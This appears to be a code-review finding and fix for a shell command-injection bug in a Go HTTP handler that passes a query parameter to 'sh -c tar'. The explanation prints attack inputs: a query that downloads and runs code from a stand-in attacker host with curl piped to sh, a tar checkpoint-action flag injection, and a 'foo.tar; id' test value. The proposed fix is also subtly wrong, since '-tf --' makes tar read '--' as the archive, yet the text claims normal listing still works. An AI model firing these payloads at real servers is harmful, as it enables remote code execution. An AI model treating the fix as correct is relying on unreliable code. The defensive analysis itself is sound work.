## Verdict

Confirmed. `ListArchive` builds a shell command line by concatenating the caller-supplied `archiveName` directly into a string passed to `sh -c`, and that value originates from an untrusted HTTP query parameter with no validation or escaping.

## Source

`archiveName` in `archive_handler.go`: `r.URL.Query().Get("archive")` in `ArchiveListHandler`. It is checked only for emptiness and then passed unmodified into `runner.ListArchive(r.Context(), archiveName)`, which forwards it straight to the vulnerable call in `archive_runner.go`.

## Fix

```go
package archivelist

import (
	"context"
	"errors"
	"os/exec"
	"path/filepath"
	"strings"
)

type ArchiveRunner struct{}

func (r *ArchiveRunner) ListArchive(ctx context.Context, archiveName string) ([]byte, error) {
	if err := validateArchiveName(archiveName); err != nil {
		return nil, err
	}

	// No shell involved: arguments are passed directly to the tar process,
	// so shell metacharacters in archiveName have no special meaning.
	cmd := exec.CommandContext(ctx, "tar", "-tf", "--", archiveName)
	return cmd.CombinedOutput()
}

func validateArchiveName(archiveName string) error {
	// Reject path separators/traversal so the name can't escape an expected
	// directory or reference an arbitrary filesystem path.
	if archiveName != filepath.Base(archiveName) || strings.Contains(archiveName, "..") {
		return errors.New("invalid archive name")
	}
	// Reject a leading "-" so the value can't be interpreted as a tar flag
	// even though "--" already marks the end of options for tar itself.
	if strings.HasPrefix(archiveName, "-") {
		return errors.New("invalid archive name")
	}
	return nil
}
```

`ArchiveListHandler` in `archive_handler.go` needs no change: it already rejects an empty value and passes `archiveName` straight through, so the validation belongs in `ListArchive` where the process is actually invoked.

## Explanation

The original code runs `sh -c "tar -tf " + archiveName`, so `archiveName` is interpreted by a shell before `tar` ever sees it. Any request like `?archive=foo.tar;curl+attacker.example|sh` (or using backticks, `$()`, `|`, `&&`, etc.) lets the caller run arbitrary commands with the privileges of the server process, not just list an archive.

The fix has two parts:

1. **Eliminate the shell.** `exec.CommandContext(ctx, "tar", "-tf", "--", archiveName)` invokes `tar` directly with an argument array. Go passes each element to the OS's process-creation API as a discrete argument; there is no shell parsing step, so characters like `;`, `|`, `` ` ``, `$()`, and `&&` are inert; they simply become literal bytes inside `archiveName`.
2. **Close the argument-injection gap an argument array alone doesn't close.** Passing a raw array stops shell metacharacters but not a value that looks like a flag to `tar` itself (e.g. `archive=--checkpoint=1 --checkpoint-action=exec=sh`). The `--` before `archiveName` tells `tar` that everything after it is a positional operand, not an option, and `validateArchiveName` additionally rejects a leading `-` and any path separator or `..` segment, so the value can't be used for flag injection or to reference a path outside the intended directory.

Verification: exercise the handler with an archive name containing shell metacharacters (e.g. `foo.tar; id`) and confirm the process fails to find a file by that literal name rather than executing `id`; then exercise it with a normal archive filename and confirm `tar -tf` still lists its contents correctly.
